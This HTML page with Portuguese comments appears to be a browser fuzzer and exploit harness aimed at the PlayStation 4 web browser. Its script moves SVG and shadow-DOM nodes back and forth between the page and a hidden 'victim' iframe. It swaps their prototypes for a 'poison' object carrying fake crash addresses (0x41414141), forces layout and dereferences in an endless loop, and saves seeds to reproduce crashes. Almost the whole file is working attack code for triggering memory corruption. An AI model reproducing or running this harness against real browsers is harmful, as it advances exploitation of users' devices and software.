<!DOCTYPE html>
<html>
<head>
    <title>PS4 Atomic Titan (Silent Mode)</title>
    <style>
        body { background: #050505; color: #ffaa00; font-family: monospace; overflow: hidden; margin: 0; }
        
        #hud { 
            position: fixed; top: 0; left: 0; width: 100%; 
            background: rgba(10, 5, 0, 0.95); 
            border-bottom: 2px solid #fa0; 
            padding: 15px; z-index: 9999;
            font-size: 22px; font-weight: bold;
        }
        .chaos { position: absolute; border: 1px dotted #666; }
    </style>
</head>
<body>
    <div id="hud">
        <div>SILENT ATOMIC: <span style="color:lime">RODANDO</span> <span id="beat">☢</span></div>
        <div style="font-size: 16px; color: #aaa; margin-top: 5px;">
            SEED: <span id="seed-disp" style="color:#fff">...</span> | 
            VENENO: <span id="poison-status" style="color:red">ATIVO (0x41...)</span>
        </div>
    </div>

    <iframe id="victim-frame" style="width:10px; height:10px; opacity:0.1; position:absolute; bottom:0; right:0;"></iframe>
    
    <div id="arena" style="margin-top: 100px;"></div>

    <script>
        // ================= CONFIGURAÇÃO =================
        const MAX_NODES = 900; 
        // ============================================

        let currentSeed = parseInt(localStorage.getItem('silent_seed') || Math.floor(Math.random() * 100000));
        localStorage.setItem('silent_last_start', currentSeed);

        function seed(s) { currentSeed = s; }
        function rnd() {
            var t = currentSeed += 0x6D2B79F5;
            t = Math.imul(t ^ t >>> 15, t | 1);
            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
            return ((t ^ t >>> 14) >>> 0) / 4294967296;
        }
        function coinflip() { return rnd() > 0.5; }

        const seedSpan = document.getElementById('seed-disp');
        const beatSpan = document.getElementById('beat');
        const arena = document.getElementById('arena');
        const frame = document.getElementById('victim-frame');

        let liveNodes = [];
        let cycleCount = 0;

        // 1. CRIAÇÃO (SVG + ShadowDOM)
        function createAtomicNode() {
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
            let div = document.createElement("div");
            div.className = "chaos";
            
            if (div.attachShadow && coinflip()) {
                try {
                    let sh = div.attachShadow({mode: coinflip() ? 'open' : 'closed'});
                    sh.innerHTML = "<slot></slot><b>X</b>";
                } catch(e){}
            }
            foreign.appendChild(div);
            svg.appendChild(foreign);
            return svg;
        }

        // 2. O VENENO (Gadget Trap)
        function getPoison() {
            return {
                isAdmin: true,
                addEventListener: 0x41414141, // Crash addr
                removeEventListener: 0x42424242,
                appendChild: "CRASH",
                map: 1,
                filter: 1
            };
        }

        // 3. O ATAQUE (Focado no Iframe)
        function triggerSilentAttack(el) {
            try {
                // Usa SEMPRE o iframe, nunca popup
                if (!frame.contentDocument) return;
                let otherDoc = frame.contentDocument;

                let obs = new MutationObserver((mutations) => {
                    let t = mutations[0].target;
                    t.textContent = "D"; 
                    if (t.parentNode) t.parentNode.removeChild(t);
                });
                obs.observe(el, { attributes: true, childList: true, subtree: true });

                // Move para o iframe
                otherDoc.adoptNode(el);
                otherDoc.body.appendChild(el);

                // INJEÇÃO DE VENENO
                try {
                    el.__proto__ = getPoison();
                    // Força deref
                    let _ = el.addEventListener; 
                } catch(e) {}

                // Traz de volta
                document.adoptNode(el);
                arena.appendChild(el);
                
                obs.disconnect();
            } catch(e) {}
        }

        function stress(el) {
            try {
                let _ = el.getBoundingClientRect().left;
                el.style.display = coinflip() ? 'none' : 'block';
                _ = el.offsetHeight;
            } catch(e){}
        }

        async function loop() {
            while(true) {
                cycleCount++;
                seedSpan.innerText = currentSeed;
                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";

                if (cycleCount % 100 === 0) localStorage.setItem('silent_seed', currentSeed);

                await new Promise(r => setTimeout(r, 25)); // Render pause

                for(let k=0; k < 25; k++) { 
                    seed(currentSeed);

                    // Build
                    if (liveNodes.length < MAX_NODES) {
                        let el = createAtomicNode();
                        arena.appendChild(el);
                        liveNodes.push(el);
                    }

                    // Attack
                    let victim = liveNodes[Math.floor(rnd() * liveNodes.length)];
                    if (victim) {
                        if (coinflip()) triggerSilentAttack(victim);
                        stress(victim);
                    }

                    // Destroy
                    if (liveNodes.length > MAX_NODES * 0.85) {
                        let idx = Math.floor(rnd() * liveNodes.length);
                        let dying = liveNodes[idx];
                        liveNodes.splice(idx, 1);
                        
                        if (coinflip()) {
                            setTimeout(() => { try{ dying.remove(); }catch(e){} }, 0);
                        } else {
                            try{ dying.remove(); }catch(e){}
                        }
                    }
                    rnd(); 
                }
                currentSeed++;

                // Limpeza leve
                if (cycleCount % 300 === 0) {
                    frame.src = "about:blank"; // Reseta o iframe vítima
                }
            }
        }

        setTimeout(loop, 500);
    </script>
</body>
</html>
